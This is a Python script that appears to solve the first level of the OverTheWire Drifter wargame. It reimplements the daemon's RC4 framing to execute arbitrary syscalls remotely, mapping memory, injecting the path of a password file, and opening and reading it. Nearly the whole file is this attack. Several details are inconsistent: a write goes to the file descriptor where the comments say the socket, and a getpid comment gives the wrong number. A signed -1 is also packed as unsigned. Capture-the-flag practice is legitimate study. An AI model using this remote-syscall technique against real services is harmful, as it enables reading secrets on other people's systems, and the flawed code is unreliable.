#!/usr/bin/env python3
"""Drifter L0 client: talk RC4-syscall protocol to drifter.labs.overthewire.org:1111.

Protocol (from /drifter/drifter0_src/drifter0.c, world-readable):
- keymat = 4B source IP + 2B source port (as the SERVER sees sin_addr/sin_port,
  i.e. port in network byte order)
- rc4_key state prepared twice (key_in, key_out) from keymat
- both streams skip 42 iterations of rc4(keymat,6) = 252 bytes of keystream
- loop: read 36B (9 dwords), rc4-decrypt with key_in, syscall(args[0],..args[8]),
  rc4-encrypt the 4B int return with key_out, write it back
"""
import socket, struct, sys

def rc4_crypt(state, x, y, data):
    buf = bytearray(data)
    for i in range(len(buf)):
        x = (x + 1) % 256
        y = (state[x] + y) % 256
        state[x], state[y] = state[y], state[x]
        k = state[(state[x] + state[y]) % 256]
        buf[i] ^= k
    return state, x, y, bytes(buf)

def prepare_key(keymat):
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (keymat[i % len(keymat)] + state[i] + j) % 256
        state[i], state[j] = state[j], state[i]
    return state, 0, 0

def call(sock, key_in, key_out, nr, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0, a7=0, a8=0):
    args = struct.pack("<9I", nr, a1, a2, a3, a4, a5, a6, a7, a8)
    si, xi, yi, enc = rc4_crypt(list(key_in[0]), key_in[1], key_in[2], args)
    key_in = (si, xi, yi)
    sock.sendall(enc)
    ret = sock.recv(4)
    assert len(ret) == 4, ret
    so, xo, yo, dec = rc4_crypt(list(key_out[0]), key_out[1], key_out[2], ret)
    key_out = (so, xo, yo)
    return key_in, key_out, struct.unpack("<i", dec)[0]

def main():
    host = "drifter.labs.overthewire.org"
    port = 1111
    sock = socket.create_connection((host, port), timeout=10)
    me = sock.getsockname()          # what the SERVER sees as the peer
    keymat = socket.inet_aton(me[0]) + struct.pack(">H", me[1])
    print("keymat:", keymat.hex(), "(my ip", me[0], "my port", me[1], ")")

    st_in, xi, yi = prepare_key(keymat)
    st_out, xo, yo = prepare_key(keymat)
    # skip 42 * rc4(keymat, 6) on both streams
    for _ in range(42):
        st_in, xi, yi, _ = rc4_crypt(st_in, xi, yi, b"\0" * 6)
        st_out, xo, yo, _ = rc4_crypt(st_out, xo, yo, b"\0" * 6)
    key_in = (st_in, xi, yi)
    key_out = (st_out, xo, yo)

    # syscall(39=getpid) as a handshake
    key_in, key_out, pid = call(sock, key_in, key_out, 20)  # i386 getpid = 20
    print("getpid ->", pid)

    # open("/chroot-relative path") — we are chrooted, password at /drifter0.password
    # O_RDONLY=0. args[1]=path ptr... but we have NO memory to point at!
    # Every pointer arg must reference memory we control inside the daemon.
    # Trick used for vortex-style levels: first MMAP anonymous memory (syscall 192
    # oldoldmmap / 90 mmap on i386) at a fixed address, then WRITE to it via
    # syscall 4 (write fd=addr)? No — write writes FROM memory.
    # Standard solution: use sys_read(0/sock-fd, addr, n) to fill the mmap'd
    # region with our data — fd 0/1 is the socket in the daemon child.
    key_in, key_out, r = call(sock, key_in, key_out, 192, 0x10000000, 0x1000,
                              3, 0x32, -1, 0)  # mmap2(NULL,4096,PROT_RW,MAP_PRIVATE|ANON,-1,0)
    print("mmap2 ->", hex(r & 0xffffffff))

    # read from the socket INTO the mapped page: sys_read(fd=cli socket, buf, 8)
    # The child's socket fd: accept() returns it — fd 3 or 4; try 4 (0,1,2 std, 3 listener closed in child)
    # Actually child closes skt (listener=3), so cli is fd 4? No: accept returns the
    # lowest free fd = 4 if listener is 3... in the child skt is closed so cli=4.
    # Send the path string first, then syscall read(4, 0x10000000, len).
    path = b"/drifter0.password\0"
    sock.sendall(path)
    key_in, key_out, r = call(sock, key_in, key_out, 3, 4, 0x10000000, len(path))
    print("read ->", r)

    # open(path, O_RDONLY) = syscall 5
    key_in, key_out, fd = call(sock, key_in, key_out, 5, 0x10000000, 0, 0)
    print("open ->", fd)

    if fd < 0:
        return
    # read(fd, buf+0x100, 64)
    key_in, key_out, r = call(sock, key_in, key_out, 3, fd, 0x10000100, 64)
    print("read ->", r)
    # write(buf+0x100, ...)? we can't read daemon memory back...
    # But write(4, buf, n) SENDS it to us over the socket! fd 4 = our connection.
    key_in, key_out, r = call(sock, key_in, key_out, 4, fd, 0x10000100, 33)
    print("write ->", r)
    # The password bytes went to the socket as RAW data (not RC4-framed) —
    # drain whatever comes.
    sock.settimeout(3)
    try:
        data = sock.recv(64)
        print("RAW:", data)
    except socket.timeout:
        print("no raw data")

if __name__ == "__main__":
    main()
